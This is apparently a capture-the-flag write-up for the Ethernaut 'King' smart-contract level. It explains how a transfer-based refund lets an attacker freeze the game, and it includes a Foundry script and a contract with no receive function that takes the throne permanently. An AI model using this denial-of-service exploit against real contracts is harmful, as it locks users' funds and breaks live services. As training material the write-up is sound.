# King   
This level was quite interesting. The goal is to break the game in such a way that no other contracts or wallets can become the king. The key to solving this challenge lies in the `receive` function of the target contract: 
```solidity
receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
```
The issue here is the use of the `transfer` function to send Ether to the current king. If the `transfer` fails (e.g., if the recipient is a contract that cannot receive Ether), the entire transaction will revert, and the `king` and `prize` variables will not be updated. This creates an opportunity to break the game by ensuring that the `transfer` always fails.

To exploit this, we can deploy a contract that becomes the king but does not implement a `receive` or `fallback` function. This means that when the target contract attempts to send Ether back to our contract using `transfer`, the transaction will fail, and no one else will be able to become the new king.

Here’s the script I used to automate the attack:
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
		
	NewKing newKing;	
	address victim = /* Your instance address */ ;	

	function run() public {
	(, bytes memory data) = victim.staticcall(abi.encodeWithSignature("prize()"));
	uint256 prize = abi.decode(data, (uint256));	
	vm.startBroadcast();
	newKing = new NewKing{value: prize}(victim, prize);
	newKing.attack();
	vm.stopBroadcast();
}
}

contract NewKing {
	address victim;
	uint256 prize;

	constructor(address _victim, uint256 _prize) payable {
	victim = _victim;
	prize = _prize;
}

	function attack() public {
	victim.call{value: prize}("");
}
}
```
